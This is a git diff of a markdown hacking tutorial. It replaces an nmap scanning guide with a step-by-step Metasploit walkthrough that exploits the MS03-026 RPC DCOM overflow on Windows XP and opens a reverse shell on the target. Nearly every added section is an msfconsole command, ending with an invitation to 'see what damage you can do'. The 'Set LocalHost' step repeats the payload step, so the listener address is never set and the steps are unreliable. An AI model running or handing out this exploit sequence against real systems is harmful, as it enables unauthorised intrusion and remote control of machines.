@@ -2,22 +2,63 @@
 There are multiple exploits for an un-patched windows xp box. Here is a guide on how to do one of them:
 
 ## Step 1 - Metasploit
-Ok, we're going to run a really quick scan. 
+Ok, we're going to be using metasploit for this attack. To get started run the following in a terminal:
 
-`nmap -sP 10.0.0.3-255`
+`sudo msfconsole`
+Be patient, it takes awhile for Metasploit to load all of its modules. The current version of Metasploit has 823 exploits and 250 payloads.
 
-This is called a ping scan (`-sP`). Basically it checks every host that responds to ICMP pings. Yours should look like this:
+## Step 2 - Find the exploit 
 
-![Image of Ping Scan](images/scan1.png)
+One of the most reliable hacks is on the ubiquitous Windows XP system with the RPC DCOM. It's a buffer overflow attack that enables the attacker to execute any code of their choice on the owned box (note Microsoft's comment under impact of vulnerability). Microsoft identifies it as MS03-026 in their database of vulnerabilities. In our case, we will use it to open a reverse shell on our target system.
 
-As you can see we get 13 hosts up.
-Let's save that result to a file.
+Now run `msf > search dcom` 
+This will find the exploit
 
-`nmap -sP 10.0.0.3-255 -oN ~/Desktop/pingscan.txt`
+![Image of the mfs terminal](images/634704378236167812.jpg)
 
-That'll take a second to run, when it's done it'll write a file to your desktop that looks like the scan we got back.
+## Set the exploit 
+Now let's tell Metasploit what exploit we want to use.
+Type use and the name of our exploit, exploit/windows/dcerpc/ms03_026_dcom.
 
-![Image of File on Desktop](images/save-to-file.png)
+`msf > use exploit/windows/dcerpc/ms03_026_dcom`
 
-## Step 2 - OS Detect
-Alright, we've got 13 hosts saved to a file now. That's great, but which ones are the windows or linux machines? That's where [OS Detect](https://nmap.org/book/man-os-detection.html) comes in. 
+## Set the options
+Now that we've chosen our exploit, we can ask Metasploit what our options are. By typing show options, Metasploit will list our options in executing this exploit.
+
+`msf > show options`
+
+## Set Remote host
+Metasploit will now ask us for the RHOST. This will be the IP address of the remote host or the machine we're attacking. In our case, it's 10.0.0.3. Use the actual IP address of the machine you are attacking. Tools such as nmap can help in identifying the IP address of the machine you are attacking. Notice in the picture above that Metasploit tells us that we will be using (binding) port 135.
+
+`msf > set RHOST 10.0.0.3`
+
+## Show Payloads
+Next, we check to see what payloads are available for this exploit. Type show payloads at the Metasploit prompt:
+
+`msf > show payloads`
+
+## Set Payload
+Now that we can see what payloads are available, we can select the generic/shell_reverse_tcp by using the Metasploit console set command. If successful, this will establish a remote shell on the target system that we can command.
+
+`msf > set PAYLOAD generic/shell_reverse_tcp`
+
+## Set LocalHost
+Now that we can see what payloads are available, we can select the generic/shell_reverse_tcp by using the Metasploit console set command. If successful, this will establish a remote shell on the target system that we can command.
+
+`msf > set PAYLOAD generic/shell_reverse_tcp`
+
+## Exploit 
+Now we command Metasploit to exploit the system:
+
+`msf > exploit`
+
+## Open a shell! 
+Type the command sessions –i 1 to open a command shell on the XP system that will appear on your Metasploit console.
+
+`sessions –i 1`
+
+To confirm that the command shell is on the Windows XP system, type dir to get a directory listing on the Windows XP system that you now own!
+
+`C: >dir`
+
+Congrats! Now see what damage you can do! 
